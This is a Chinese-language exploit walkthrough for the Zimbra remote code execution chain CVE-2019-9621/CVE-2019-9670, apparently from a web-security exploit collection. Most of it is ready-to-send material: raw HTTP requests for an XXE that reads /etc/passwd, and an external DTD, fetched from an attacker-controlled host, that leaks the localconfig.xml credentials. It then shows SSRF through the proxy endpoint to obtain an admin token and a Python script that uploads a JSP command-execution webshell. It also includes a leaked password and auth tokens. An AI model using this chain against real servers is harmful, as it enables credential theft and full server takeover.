<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xbd2bc93e312e2d80bc873a743e27b62474967bd"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-9621</span><span class="csECDA2D3">）（</span><span class="csDE05BCC">CVE-2019-9670</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Zimbra </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06"> Zimbra </span><span class="cs9C1B1871">存在像任意文件读取、</span><span class="cs8926E06">XXE</span><span class="cs9C1B1871">（</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取</span><span class="cs8926E06"> localconfig.xml</span><span class="cs9C1B1871">配置文件，获取到</span><span class="cs8926E06"> zimbra admin ldap password</span><span class="cs9C1B1871">，并通过</span><span class="cs8926E06"> 7071 admin </span><span class="cs9C1B1871">端口进行</span><span class="cs8926E06"> SOAP AuthRequest </span><span class="cs9C1B1871">认证，得到</span><span class="cs8926E06"> admin authtoken</span><span class="cs9C1B1871">漏洞是利用</span><span class="cs8926E06">XXE</span><span class="cs9C1B1871">和</span><span class="cs8926E06">ProxyServlet SSRF </span><span class="cs9C1B1871">漏洞拿到</span><span class="cs8926E06"> admin authtoken </span><span class="cs9C1B1871">后，通过文件上传在服务端执行任意代码，威胁程度极高。当</span><span class="cs8926E06">Zimbra</span><span class="cs9C1B1871">服务端打来</span><span class="cs8926E06">Memcached</span><span class="cs9C1B1871">缓存服务是，可以利用</span><span class="cs8926E06">SSRF</span><span class="cs9C1B1871">攻击进行反序列化执行远程代码。不过由于</span><span class="cs8926E06">Zimbra</span><span class="cs9C1B1871">在单服务器安装中尽管</span><span class="cs8926E06">Memcached</span><span class="cs9C1B1871">虽然启动但是并没有进行使用，所以其攻击场景受到限制。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ZimbraCollaboration Server 8.8.11 </span><span class="cs9C1B1871">之前的版本都受到影响。具体来说：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">Zimbra &lt; 8.7.11 </span><span class="cs9C1B1871">版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</span></li><li class="cs24C36B3"><span class="cs8926E06">Zimbra &lt; 8.8.11 </span><span class="cs9C1B1871">版本中，在服务端使用</span><span class="cs8926E06"> Memcached </span><span class="cs9C1B1871">做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。</span></li></ul>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="第一步检测是否存在xxe漏洞"><span class="csD6CA00D2">第一步：检测是否存在</span><span class="csD1E291E2">xxe</span><span class="csD6CA00D2">漏洞</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /Autodiscover/Autodiscover.xml HTTP/1.1 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://mail.****.com/zimbra/ &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/soap+xml &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 436 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: ZM_TEST=true &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1 &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;!DOCTYPE xxe [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ELEMENT name ANY &gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;Request&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/Request&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;/Autodiscover&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="320" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="第二步读取zimbra用户账号密码"><span class="csD6CA00D2">第二步：读取</span><span class="csD1E291E2">zimbra</span><span class="csD6CA00D2">用户账号密码</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">dtd</span><span class="cs9C1B1871">文件内容如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#39;%start;%file;%end;&#39;&gt;&quot;&gt; </span></p><p class="cs6FD73CFB"><span class="cs8926E06">POST</span><span class="cs9C1B1871">请求包如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /Autodiscover/Autodiscover.xml HTTP/1.1 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://mail.****.com/zimbra/ &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/soap+xml &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 436 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: ZM_TEST=true &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1 &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;!DOCTYPE Autodiscover [ &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!ENTITY % dtd SYSTEM &quot;http://www.0-sec.org/dtd&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%dtd; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%all; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;Request&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/Request&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/Autodiscover&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="179" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里利用了</span><span class="cs8926E06">CVE-2019-9670</span><span class="cs9C1B1871">漏洞来读取配置文件，你需要在自己的</span><span class="cs8926E06">VPS</span><span class="cs9C1B1871">服务器上放置一个</span><span class="cs8926E06">dtd</span><span class="cs9C1B1871">文件，并使该文件能够通过</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">访问。为了演示，我在</span><span class="cs8926E06">GitHub</span><span class="cs9C1B1871">上创建了一个仓库，从</span><span class="cs8926E06">GitHub</span><span class="cs9C1B1871">上获取</span><span class="cs8926E06">dtd</span><span class="cs9C1B1871">文件。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上图中用红框圈起来的就是</span><span class="cs8926E06">zimbra</span><span class="cs9C1B1871">账号的密码</span></p><h3 class="cs868C439D">
			<a name="第三步获取低权限token"><span class="csD6CA00D2">第三步：获取低权限</span><span class="csD1E291E2">token</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">POST</span><span class="cs9C1B1871">请求包如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /service/soap HTTP/1.1 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://mail.****.com/zimbra/ &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/soap+xml &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 467 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: ZM_TEST=true &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1 &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;soap:Header&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;context xmlns=&quot;urn:zimbra&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;userAgent name=&quot;ZimbraWebClient&quot; version=&quot;5.0.15_GA_2851&quot;/&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/context&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;/soap:Header&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;soap:Body&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&lt;AuthRequest xmlns=&quot;urn:zimbraAccount&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;password&gt;</span><span class="cs7FFD2630">上面得到的密码</span><span class="cs9FB05234">&lt;/password&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&lt;/AuthRequest&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;/soap:Body&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/soap:Envelope&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="250" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从上图可以看到已经获取到</span><span class="cs8926E06">token</span><span class="cs9C1B1871">，但该</span><span class="cs8926E06">token</span><span class="cs9C1B1871">不是管理员权限的</span><span class="cs8926E06">token</span><span class="cs9C1B1871">，暂时记下来以后要用。</span></p><h3 class="cs868C439D">
			<a name="X73577c91ae673180023d420d3478c96339d485e"><span class="csD6CA00D2">第四步：利用</span><span class="csD1E291E2">SSRF</span><span class="csD6CA00D2">漏洞通过</span><span class="csD1E291E2">proxy</span><span class="csD6CA00D2">接口，访问</span><span class="csD1E291E2">admin</span><span class="csD6CA00D2">的</span><span class="csD1E291E2">soap</span><span class="csD6CA00D2">接口获取高权限</span><span class="csD1E291E2">Token</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">POST</span><span class="cs9C1B1871">请求包如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:7071 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: https://mail.****.com/zimbra/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/soap+xml &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 465 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: ZM_ADMIN_AUTH_TOKEN=0_5221766f264e4dcb78b4f67be5f839b1ed668da3_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535343733303133353638333b747970653d363a7a696d6272613b7469643d393a3735353034333637323b &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1 &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;soap:Header&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;context xmlns=&quot;urn:zimbra&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851&quot;/&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/context&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;/soap:Header&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;soap:Body&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;password&gt;GzXaU76_s5&lt;/password&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&lt;/AuthRequest&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;/soap:Body&gt; &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/soap:Envelope&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="270" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">中设置</span><span class="cs9FB05234">Key</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">ZM_ADMIN_AUTH_TOKEN</span><span class="cs9C1B1871">，值为上面请求所获取的</span><span class="cs8926E06">token</span><span class="cs9C1B1871">，将</span><span class="cs9FB05234">xmlns=&quot;urn:zimbraAccount&quot;</span><span class="cs9C1B1871">修改为</span><span class="cs9FB05234">xmlns=&quot;urn:zimbraAdmin&quot;</span><span class="cs9C1B1871">，在</span><span class="cs8926E06">Host</span><span class="cs9C1B1871">字段末尾添加</span><span class="cs8926E06">&ldquo;:7071&rdquo;</span><span class="cs9C1B1871">，</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">target</span><span class="cs9C1B1871">要使用</span><span class="cs8926E06">https</span><span class="cs9C1B1871">协议。然后发送请求即可获得</span><span class="cs8926E06">admin</span><span class="cs9C1B1871">权限的</span><span class="cs8926E06">token</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="第五步利用高权限token传文件getshell"><span class="csD6CA00D2">第五步：利用高权限</span><span class="csD1E291E2">token</span><span class="csD6CA00D2">传文件</span><span class="csD1E291E2">getshell</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="201" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将上一步获取的</span><span class="cs8926E06">admin</span><span class="cs9C1B1871">权限</span><span class="cs8926E06">token</span><span class="cs9C1B1871">添加到</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中，然后上传</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Webshell</span><span class="cs9C1B1871">路径为</span><span class="cs8926E06">/downloads/k4x6p.jsp</span><span class="cs9C1B1871">，访问该</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">时需要在</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中添加</span><span class="cs8926E06">admin_toke</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">你可以利用此</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">在其他无需</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">即可访问的目录里创建一个可用菜刀连接的小马。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="240" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="csE3F655E4">简易</span><span class="cs5BEC2C28">poc</span></p><p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">file= {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;filename1&#39;:(None,&quot;whocare&quot;,None),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;clientFile&#39;:(&quot;sunian.jsp&quot;,r&#39;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1){out.println(new String(b));}out.print(&quot;&lt;/pre&gt;&quot;);}%&gt;&#39;,&quot;text/plain&quot;), </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;requestId&#39;:(None,&quot;12&quot;,None),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers ={ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;Cookie&quot;:&quot;ZM_ADMIN_AUTH_TOKEN=0_eb68a2a147c98c6d0c2257d7638c4f1256493b28_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313539323733343831303035313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3433323433373532323b&quot;,#</span><span class="cs7FFD2630">改成自己的</span><span class="cs9FB05234">admin_token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;Host&quot;:&quot;foo:7071&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r=requests.post(&quot;https://192.168.37.137:7071/service/extension/clientUploader/upload&quot;,files=file,headers=headers,verify=False) &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(r.text)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="83" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">虽然执行报错了，但是不影响</span><span class="cs8926E06"><br/>shell</span><span class="cs9C1B1871">地址：</span><span class="cs8926E06">https://www.0-sec.org:7071/downloads/sunian.jsp</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="536" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="完整版exp"><span class="csD6CA00D2">完整版</span><span class="csD1E291E2">exp</span></a></h3>
